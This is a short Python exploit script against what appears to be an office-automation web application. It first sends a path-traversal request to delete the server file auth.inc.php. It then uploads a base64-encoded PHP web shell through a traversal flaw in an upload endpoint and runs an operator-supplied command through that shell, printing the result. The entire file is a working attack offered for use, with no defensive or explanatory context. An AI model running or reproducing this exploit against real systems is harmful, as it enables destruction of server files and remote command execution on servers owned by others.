import requests
import optparse
import base64
print('''
Author:ghtwf01
''')
parser = optparse.OptionParser("-u <upload target> -i <include target>")
parser.add_option('-u', dest='url', type='string', help='地址')
parser.add_option('-o', dest='cmd', type='string', help='需要执行的命令')
(options, args) = parser.parse_args()
url = options.url
cmd = options.cmd
input("接下来的操作会删除一个文件，可能会导致服务不能正常运行，是否确认继续执行，按回车键继续")
try:
    unlink_file = requests.get(url+"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php")
except:
    pass
with open("shell.php","w") as file:
    file.write(base64.b64decode("PD9waHAKJGNvbW1hbmQ9JF9HRVRbJ2NtZCddOwokd3NoID0gbmV3IENPTSgnV1NjcmlwdC5zaGVsbCcpOwokZXhlYyA9ICR3c2gtPmV4ZWMoImNtZCAvYyAiLiRjb21tYW5kKTsKJHN0ZG91dCA9ICRleGVjLT5TdGRPdXQoKTsKJHN0cm91dHB1dCA9ICRzdGRvdXQtPlJlYWRBbGwoKTsKZWNobyAkc3Ryb3V0cHV0Owo/Pg==").decode("utf-8"))
upload_file = {'FILE1':open('shell.php','r')}
upload_data = {"filetype":"a", "action":"upload", "repkid":"../../../"}
response = requests.post(url+"/general/data_center/utils/upload.php", upload_data, files=upload_file)
res = requests.get(url+"/_shell.php?cmd="+cmd)
print(res.text)